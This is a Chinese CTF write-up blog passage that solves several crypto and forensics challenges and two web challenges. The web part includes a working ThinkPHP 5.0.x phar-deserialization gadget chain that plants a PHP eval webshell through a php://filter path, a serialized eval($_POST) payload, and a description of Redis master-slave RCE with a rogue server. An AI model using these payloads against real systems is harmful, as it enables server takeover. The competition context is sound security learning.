<h2 id="Classic-Crypto-king2"><a href="#Classic-Crypto-king2" class="headerlink" title="Classic_Crypto_king2"></a>Classic_Crypto_king2</h2><p>base92的乱序版？table和key一一对应，怎么来怎么回去</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~#$%&amp;()&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;Y:AHor7yd%`vn|i4q1NzapTG3/^5WbL6wE?.Q&lt;Mcse#Bgjhlf8O&#125;_*&#123;m;J=RFC-(9])ZXD,&amp;&gt;kI$@~[SK02x!u+VtU\P&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;&#123;1`5aMme2OGHKnB`5onbH*KQ44`:5KbOK`83m1i5Kn1o*`Mbi5-!&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    flag += table[key.index(i)]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="The-nature-of-the-human"><a href="#The-nature-of-the-human" class="headerlink" title="The_nature_of_the_human"></a>The_nature_of_the_human</h2><p>有两个可以反向爆破，另外一个拿自动解base的函数改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log</span><br><span class="line"></span><br><span class="line">ls = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    ls.append(sha256(i.encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> printable[ls.index(x)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">114514</span>, <span class="built_in">ord</span>(x), <span class="number">1919810</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lx = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">    lx.append(fun2(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = b16decode(x)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = b64decode(x)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = b32decode(x)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">cipher = [<span class="number">617074</span>, <span class="string">&#x27;aaa9402664f1a41f40ebbc52c9993eb66aeb366602958fdfaa283b71e64db123&#x27;</span>, <span class="number">1452754</span>, <span class="string">&#x27;454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1&#x27;</span>, <span class="string">b&#x27;6B&#x27;</span>, <span class="string">b&#x27;53553039505430395054303D&#x27;</span>, <span class="number">1165366</span>, <span class="string">&#x27;f67ab10ad4e4c53121b6a5fe4da9c10ddee905b978d3788d2723d7bfacbe28a9&#x27;</span>, <span class="string">b&#x27;UE09PT09PT0=&#x27;</span>, <span class="string">&#x27;1b16b1df538ba12dc3f97edbb85caa7050d46c148134290feba80f8236c83db9&#x27;</span>, <span class="string">&#x27;5feceb66ffc86f38d952786c6d696c79c2dbc239dd4e91b46729d73a27fb57e9&#x27;</span>, <span class="string">&#x27;d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde&#x27;</span>, <span class="string">&#x27;454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1&#x27;</span>, <span class="number">652094</span>, <span class="number">738306</span>, <span class="string">b&#x27;ZQ==&#x27;</span>, <span class="string">b&#x27;55673D3D&#x27;</span>, <span class="string">&#x27;043a718774c572bd8a25adbeb1bfcd5c0256ae11cecf9f9c3f925d0e52beaf89&#x27;</span>, <span class="string">b&#x27;54565539505430395054303D&#x27;</span>, <span class="string">&#x27;d2e2adf7177b7a8afddbc12d1634cf23ea1a71020f6a1308070a16400fb68fde&#x27;</span>, <span class="string">b&#x27;Yg==&#x27;</span>, <span class="number">889404</span>, <span class="string">b&#x27;4F513D3D3D3D3D3D&#x27;</span>, <span class="number">1242964</span>, <span class="string">&#x27;454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1&#x27;</span>, <span class="string">b&#x27;MU======&#x27;</span>, <span class="string">b&#x27;UA==&#x27;</span>, <span class="string">b&#x27;R009PT09PT0=&#x27;</span>, <span class="number">962556</span>, <span class="string">&#x27;e632b7095b0bf32c260fa4c539e9fd7b852d0de454e9be26f24d0d6f91d069d3&#x27;</span>, <span class="string">b&#x27;54445139505430395054303D&#x27;</span>, <span class="string">&#x27;a1fce4363854ff888cff4b8e7875d600c2682390412a8cf79b37d0b11148b0fa&#x27;</span>, <span class="string">&#x27;a9f51566bd6705f7ea6ad54bb9deb449f795582d6529a0e22207b8981233ec58&#x27;</span>, <span class="number">1443444</span>, <span class="string">&#x27;d10b36aa74a59bcf4a88185837f658afaf3646eff2bb16c3928d0e9335e945d2&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(i, <span class="built_in">int</span>):</span><br><span class="line">        flag += printable[lx.index(i)]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(i, <span class="built_in">str</span>):</span><br><span class="line">        flag += fun1(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += fun3(i).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>出来这个，提交不对</p>
<blockquote>
<p>SharkCTF{n0_r3veRse_bU9_r1P34T_yEs}</p>
</blockquote>
<p>有两个字母明显拼错，应该是脚本的问题，base那里，手动改一下就好</p>
<h2 id="baby-RSA"><a href="#baby-RSA" class="headerlink" title="baby_RSA"></a>baby_RSA</h2><p>sage解一下方程</p>
<h2 id="medium-RSA（unsolved）"><a href="#medium-RSA（unsolved）" class="headerlink" title="medium_RSA（unsolved）"></a>medium_RSA（unsolved）</h2><p>就是要伪造不同的num1和num2，使得签名的结果相等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signature(num1, pubkey) == signature(num2, pubkey)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>生成秘钥的过程</p>
</blockquote>
<p>$n=pq$<br>$g=p+q$<br>$f=\varphi/(p-1,\ q-1)$<br>$e=g^f\ mod\ n^2$<br>$v\equiv_n\lfloor(e-1)/n\rfloor^{-1}$</p>
<p>我们可以得到n，f，v</p>
<blockquote>
<p>签名的过程</p>
</blockquote>
<p>$res=\lfloor(m^f\ mod\ n^2-1)/n\rfloor\times \lfloor(g^f\ mod\ n^2-1)/n\rfloor^{-1}\ mod\ n$</p>
<p>然后把res给sha256下得到签名结果</p>
<h2 id="aes-study"><a href="#aes-study" class="headerlink" title="aes_study"></a>aes_study</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, key, plaintext</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">msg1, msg2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg1) == <span class="built_in">len</span>(msg2)</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">        res += <span class="built_in">chr</span>(msg1[i] ^ msg2[i]).encode()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv = flag</span><br><span class="line">salt = <span class="string">b&#x27;I_am_just_a_salt&#x27;</span></span><br><span class="line">plaintext = salt + plaintext</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">cipher = aes.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"><span class="built_in">print</span>(xor(salt, key))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;output</span></span><br><span class="line"><span class="string">b&quot;\x8e\xd2;\xe1K\xb6\xbb\xfbg\xaf\n\xad\xb8\x91\x1b\xc6\xb8\x15\xad\x17R\xf7\x8d\xfd\xc5\xeaq;\x8fC\x89.O\x99\xd9M\xfavva:&lt;\xd5uuL\xb4&#x27;\x96\xfb\x88 SQ\xb6K\xad\xc0\xab\xdb1D\xfdV&quot;</span></span><br><span class="line"><span class="string">b&#x27;;:\x00\x01\x00\x0b\x10\x00+&lt;\x03&lt;,\n\t\r&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint</span></span><br><span class="line"><span class="comment"># if you decrypt the key, try to run this code, you will found something interesting ^_^</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, cipher[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(cipher[<span class="number">16</span>:]))</span><br></pre></td></tr></table></figure>

<p>冷静分析一下，salt长16是第一块密文，异或得到key后直接用iv为<code>b&#39;\x00&#39;*16</code>生成aes对象，然后解密salt得到的再与salt异或就是原本的iv，就是flag，hint没深究什么用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">msg1, msg2</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg1) == <span class="built_in">len</span>(msg2)</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">        res += <span class="built_in">chr</span>(msg1[i] ^ msg2[i]).encode()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">salt = <span class="string">b&#x27;I_am_just_a_salt&#x27;</span></span><br><span class="line">cipher = <span class="string">b&quot;\x8e\xd2;\xe1K\xb6\xbb\xfbg\xaf\n\xad\xb8\x91\x1b\xc6\xb8\x15\xad\x17R\xf7\x8d\xfd\xc5\xeaq;\x8fC\x89.O\x99\xd9M\xfavva:&lt;\xd5uuL\xb4&#x27;\x96\xfb\x88 SQ\xb6K\xad\xc0\xab\xdb1D\xfdV&quot;</span></span><br><span class="line">salt_xor_key = <span class="string">b&#x27;;:\x00\x01\x00\x0b\x10\x00+&lt;\x03&lt;,\n\t\r&#x27;</span></span><br><span class="line">key = xor(salt, salt_xor_key)</span><br><span class="line"><span class="comment"># aes = AES.new(key, AES.MODE_CBC, cipher[:16])</span></span><br><span class="line"><span class="comment"># print(aes.decrypt(cipher[16:]))</span></span><br><span class="line"><span class="comment"># plaintext = b&#x27;This_is_the_real_plaintext_so_where_is_the_flag?&#x27;</span></span><br><span class="line">c1 = cipher[:<span class="number">16</span>]</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(xor(salt, aes.decrypt(c1)))</span><br></pre></td></tr></table></figure>

<h2 id="easy-RSA（unsolved）"><a href="#easy-RSA（unsolved）" class="headerlink" title="easy_RSA（unsolved）"></a>easy_RSA（unsolved）</h2><p>感觉做过，但又完全没做过</p>
<p>把私钥给加密了，然后n比较特殊是$pq^2$，只有rsa才能打败rsa<br>$$<br>\begin{align}<br>c_1=m^e\ mod\ n\\<br>c_2=d^e\ mod\ n<br>\end{align}<br>$$<br>知道c1，c2还有n</p>
<p>c1乘以c2，然后我们可以用念力把d移动到幂上</p>
<img data-src="https://img2.baidu.com/it/u=100488731,1895111324&fm=26&fmt=auto" alt="img"/>

<p>显然有两个利用点，但是如果rsa是安全的话，就算把私钥给加密了， 没有私钥应该也是得不到私钥的吧（突然废话大师我悟了），所以这个条件完全没用？</p>
<p>目前通过搜索得到的情报</p>
<ol>
<li><p>Schmidt-Samoa密码系统</p>
</li>
<li><p>Asbullah的论文，提供了两个算法</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210921102131832.png" alt="image-20210921102131832"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210921102156022.png" alt="image-20210921102156022"></p>
<p>但我用连分数试了下，无果</p>
</li>
</ol>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210923 天翼杯TeamGipsyWP</title>
    <url>/posts/90da693a/</url>
    <content><![CDATA[<p>差几名进决赛，唔，木大木大</p>
<p>密码第一题挺好的，让我一下午学会TEA，队友Web出了道web（5解），Misc还出了一道取证；感谢他们还特地赏赐我在博客上发</p>
<span id="more"></span>

<h1 id="天翼杯"><a href="#天翼杯" class="headerlink" title="天翼杯"></a>天翼杯</h1><h2 id="Web-eztp"><a href="#Web-eztp" class="headerlink" title="Web-eztp"></a>Web-eztp</h2><p>登录处是一个 5.0.10 的sql注入</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632382465862-ac9344cd-1da4-4b0d-aebc-a6cdbc19c0da.png" alt="image.png"></p>
<p>然后后面挖一条链子。</p>
<p>后台是文件上传，然后  is_dir 可以触发phar反序列化。</p>
<p>5.0.24 有个任意文件写入的漏洞，从 <code>__destruct</code> -&gt; <code>__tostring</code> -&gt; <code>__call</code> -&gt; <code>file_put_contents</code></p>
<p>题目环境是 5.0.10，原本链子的tostring 那里没办法到call，但是题目还提供了一些扩展可供使用，找个 可以触发 call 的 tostring就好。</p>
<p>由于 在析构函数的时候工作目录不稳定。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632382387356-b63e66a3-4439-4013-bf57-7de8c264636f.png" alt="image.png"></p>
<p>所以需要知道绝对路径。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Prophecy</span>\<span class="title">Argument</span>\<span class="title">Token</span>\<span class="title">ExactValueToken</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> ExactValueToken()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Prophecy</span>\<span class="title">Argument</span>\<span class="title">Token</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExactValueToken</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>=<span class="string">&#x27;jiang&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$util</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;util = <span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();<span class="comment">//目的调用其write()</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;stringify&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();<span class="comment">//目的调用File-&gt;set()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">        <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../var/www/html/public/uploads/a.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> Windows();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> \Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">\rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在头像处上传后可以获取图片存储位置。</p>
<p>触发phar协议。</p>
<p>然后<img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632382502937-30e42575-35ee-4300-9ab9-3eff71801531.png" alt="image.png"></p>
<p>参考：</p>
<p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E6%BC%8F%E6%B4%9E/Thinkphp-=-5.0.10-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E6%BC%8F%E6%B4%9E/Thinkphp-=-5.0.10-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html</a></p>
<h2 id="Web-easy-eval"><a href="#Web-easy-eval" class="headerlink" title="Web-easy_eval"></a>Web-easy_eval</h2><p>简单反序列化</p>
<p><code>O:1:&quot;b&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[%27cmd%27]);&quot;;&#125;&#125;</code> 小写绕过。</p>
<p>看了 phpinfo </p>
<p>没办法 bypass bf。</p>
<p>看到当前文件夹下有个 <code>.config.php.swp</code></p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632385942528-e424da5e-da49-402a-9289-3ed2bbd947ca.png" alt="image.png"></p>
<p>那就是打redis了。</p>
<p>redis 的rce 除了写木马，定时任务，就是主从复制rce了。</p>
<p>定时任务又只能写在 centos 系统的，此环境不合适。</p>
<p>redis外网无法访问，只能被动连接 ，先搭建恶意服务器。</p>
<p>使用蚁剑的工具。</p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632386092674-6f65800a-0b06-472a-8202-c3773b083c53.png" alt="image.png"></p>
<p><img data-src="https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1632386641769-682c576f-51ee-4a81-9027-f6826571b52e.png" alt="image.png"></p>
<p><a href="https://blog.csdn.net/qq_41891666/article/details/107103116">https://blog.csdn.net/qq_41891666/article/details/107103116</a></p>
<p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
<h2 id="Misc-Browser"><a href="#Misc-Browser" class="headerlink" title="Misc-Browser"></a>Misc-Browser</h2><blockquote>
<p>附件链接如下<br>天翼云盘： <a href="https://cloud.189.cn/web/share?code=nEnQFvVzYr22">https://cloud.189.cn/web/share?code=nEnQFvVzYr22</a><br>百度网盘： <a href="https://pan.baidu.com/s/1v4nS6EjRUOwj7A25_ocw_A">https://pan.baidu.com/s/1v4nS6EjRUOwj7A25_ocw_A</a></p>
<p>百度网盘提取码: xsct</p>
<p>flag由三个部分组成：</p>
<p>1.默认浏览器(请给出在注册表中可证明它是默认浏览器的对应的值，如：IE.HTTP)<br>2.默认浏览器版本(如：11.0.9600.18978)<br>3.默认浏览器中用户浏览次数最多的URL（如：<a href="https://www.bilibili.com/">https://www.bilibili.com/</a>)</p>
<p>三部分使用 _ 进行拼接，拼接如下：</p>
<p>IE.HTTP_11.0.9600.18978_<a href="https://www.bilibili.com/">https://www.bilibili.com/</a></p>
<p>拼接后将以上所得字符串进行MD5，即为flag，最终格式为flag{XXXXXX}</p>
</blockquote>
<p>经典的取证题，注册表取证+内存取证</p>
<h3 id="默认浏览器"><a href="#默认浏览器" class="headerlink" title="默认浏览器"></a>默认浏览器</h3><p>在Windows 10中，默认的应用程序处理是通过键<code>UserChoice</code>来进行修改。</p>
<p>没有默认浏览器，只有http、https等协议的默认处理程序。理论上，你可以将不安全的浏览器和“安全的”浏览器分开;但一般来说，默认的HTTP处理程序可能是web浏览器。</p>
<p>考察默认浏览器注册表路径，values为<code>MSEdgeHTM</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http｜https\UserChoice</span><br></pre></td></tr></table></figure>

<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923112228409.png" alt="image-20210923112228409"></p>
<p>这里还有一个常见的注册表值，但是也不一定是默认浏览器。</p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923121319839.png" alt="image-20210923121319839"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Microsoft\Edge\Application\msedge.exe&quot; --single-argument %1</span><br></pre></td></tr></table></figure>

<p>在以下有一些关于默认浏览器注册表的讨论</p>
<p><a href="https://stackoverflow.com/questions/32354861/how-to-find-the-default-browser-via-the-registry-on-windows-10">https://stackoverflow.com/questions/32354861/how-to-find-the-default-browser-via-the-registry-on-windows-10</a></p>
<h3 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h3><p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923114240368.png" alt="image-20210923114240368"></p>
<p>92.0.902.78</p>
<p>内存中也可以找到版本号，非常明显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f Browser.raw --profile=Win7SP1x86_23418 filescan | grep &quot;Edge&quot;</span><br></pre></td></tr></table></figure>

<h3 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h3><p>我们直接去找History文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f Browser.raw --profile=Win7SP1x86_23418 filescan | grep &quot;History&quot;</span><br><span class="line">\Device\HarddiskVolume1\Users\HP\AppData\Local\Microsoft\Edge\User Data\Default\History</span><br><span class="line"></span><br><span class="line">python2 vol.py -f Browser.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000007da2abf0  -D ctf/</span><br></pre></td></tr></table></figure>

<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923182128521.png" alt="image-20210923182128521"></p>
<h4 id="DB-Browser"><a href="#DB-Browser" class="headerlink" title="DB Browser"></a>DB Browser</h4><p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20210923182356877.png" alt="image-20210923182356877"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\Microsoft\Edge\Application\msedge.exe&quot; --single-argument %1_92.0.902.78_https://weibo.com/login.php</span><br><span class="line"></span><br><span class="line">MSEdgeHTM_92.0.902.78_https://weibo.com/login.php</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-TryHash（recuring）"><a href="#Crypto-TryHash（recuring）" class="headerlink" title="Crypto-TryHash（recuring）"></a>Crypto-TryHash（recuring）</h2><p>明明是TEA，装什么hash</p>
<p>从维基百科上偷来的图</p>
<p><img data-src="https://upload.wikimedia.org/wikipedia/commons/a/a1/TEA_InfoBox_Diagram.png" alt="File:TEA InfoBox Diagram.png - Wikimedia Commons"></p>
<p>我们有最多四次的加密机会，加密相同的<code>nounce</code>，这里<code>nounce</code>就是明文，需要获得<code>key</code>为<code>Iamthesuperadmin</code>的密文</p>
